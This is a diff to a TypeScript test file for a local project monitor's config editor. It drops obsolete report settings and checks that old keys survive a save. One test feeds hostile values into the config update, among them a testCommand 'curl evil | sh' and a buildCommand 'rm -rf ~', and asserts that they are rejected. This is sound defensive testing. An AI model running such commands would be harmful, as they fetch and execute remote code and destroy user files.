@@ -19,6 +19,9 @@ const BASE = {
   port: 4999,
   thresholds: { idleMinutes: 10 },
   customKey: 'kept',
+  // 없어진 보고서 설정이 남은 예전 파일: 무시하고, 저장할 때 건드리지 않는다
+  autoReportTime: '7am',
+  reportsDir: 'reports',
   projects: [
     { name: 'App', repoPath: '~/code/app', tmuxSession: 'app', testCommand: 'npm test', logFile: 'logs/a.log' },
     { name: 'Lib', repoPath: '/repo/lib' },
@@ -44,7 +47,7 @@ async function jsonFile(name = 'c.json') {
 describe('readConfigView', () => {
   it('shows raw path strings, effective settings and command locks', async () => {
     const v = readConfigView(await jsonFile(), '/base');
-    expect(v).toMatchObject({ format: 'json', editable: true, fileOnly: { host: '127.0.0.1', port: 4999, reportsDir: '/base/reports', allowedHosts: [] } });
+    expect(v).toMatchObject({ format: 'json', editable: true, fileOnly: { host: '127.0.0.1', port: 4999, allowedHosts: [] } });
     expect(v.settings.thresholds).toEqual({ idleMinutes: 10, stalledMinutes: 30, noCommitMinutes: 30 });
     expect(v.projects).toEqual([
       { id: 'app', name: 'App', repoPath: '~/code/app', tmuxSession: 'app', logFile: 'logs/a.log', testCommand: 'npm test', buildCommand: null, repoPathLocked: true, allowInput: false },
@@ -66,7 +69,6 @@ describe('applyConfigUpdate', () => {
     u.settings.refreshIntervalSec = 2;
     u.settings.thresholds.stalledMinutes = 45;
     u.settings.promptPatterns = ['(y/n)'];
-    u.settings.autoReportTime = '06:30';
     u.projects[0]!.name = 'App Renamed';
     u.projects[0]!.tmuxSession = null;
     u.projects[1]!.repoPath = '/repo/lib2';
@@ -74,7 +76,7 @@ describe('applyConfigUpdate', () => {
     applyConfigUpdate(file, '/base', u);
 
     const raw = JSON.parse(await readFile(file, 'utf8'));
-    expect(raw).toMatchObject({ port: 4999, customKey: 'kept', refreshIntervalSec: 2, thresholds: { idleMinutes: 10, stalledMinutes: 45 }, promptPatterns: ['(y/n)'], autoReportTime: '06:30' });
+    expect(raw).toMatchObject({ port: 4999, customKey: 'kept', refreshIntervalSec: 2, thresholds: { idleMinutes: 10, stalledMinutes: 45 }, promptPatterns: ['(y/n)'], autoReportTime: '7am', reportsDir: 'reports' });
     expect(raw.projects).toEqual([
       { name: 'App Renamed', repoPath: '~/code/app', testCommand: 'npm test', logFile: 'logs/a.log', id: 'app' },
       { name: 'Lib', repoPath: '/repo/lib2' },
@@ -98,13 +100,12 @@ describe('applyConfigUpdate', () => {
     const u = toUpdate(readConfigView(file, '/base')) as unknown as { settings: Record<string, unknown>; projects: Record<string, unknown>[] };
     u.settings.host = '0.0.0.0';
     u.settings.port = 1;
-    u.settings.reportsDir = '/etc';
     u.projects[0]!.testCommand = 'curl evil | sh';
     u.projects[1]!.buildCommand = 'rm -rf ~';
     u.projects.push({ id: null, name: 'Evil', repoPath: '/tmp', testCommand: 'id', buildCommand: 'id' });
     applyConfigUpdate(file, '/base', u);
     const { config } = loadConfig(file, '/base');
-    expect(config).toMatchObject({ host: '127.0.0.1', port: 4999, reportsDir: '/base/reports' });
+    expect(config).toMatchObject({ host: '127.0.0.1', port: 4999 });
     expect(config.projects.map((p) => [p.testCommand, p.buildCommand])).toEqual([['npm test', null], [null, null], [null, null]]);
   });
 
@@ -120,10 +121,9 @@ describe('applyConfigUpdate', () => {
     const bad = fresh();
     bad.settings.thresholds.idleMinutes = -5;
     bad.settings.errorPatterns = ['/(/'];
-    bad.settings.autoReportTime = '25:00';
     bad.projects[1]!.name = '';
     bad.projects[1]!.tmuxSession = 'a:b';
-    expect(issuesOf(() => applyConfigUpdate(file, '/base', bad))).toHaveLength(5);
+    expect(issuesOf(() => applyConfigUpdate(file, '/base', bad))).toHaveLength(4);
 
     const ghost = fresh();
     ghost.projects.push({ ...ghost.projects[0]!, name: 'dup' }, { id: 'nope', name: 'x', repoPath: '/x', tmuxSession: null, logFile: null, allowInput: false });
@@ -243,7 +243,7 @@ describe('/api/config', () => {
     if ((body as { version?: unknown }).version === 'stale') throw new ConfigConflict('파일이 바뀌었습니다');
     return state.view;
   });
-  const server = createApp({ config, monitor, runner, reportsDir: () => '/nonexistent', configEditor: { view: () => state.view, update } }).listen(0, '127.0.0.1');
+  const server = createApp({ config, monitor, runner, configEditor: { view: () => state.view, update } }).listen(0, '127.0.0.1');
   const url = () => `http://127.0.0.1:${(server.address() as AddressInfo).port}/api/config`;
   const put = (body: string) => fetch(url(), { method: 'PUT', headers: { 'Content-Type': 'application/json' }, body });
   afterAll(() => void server.close());
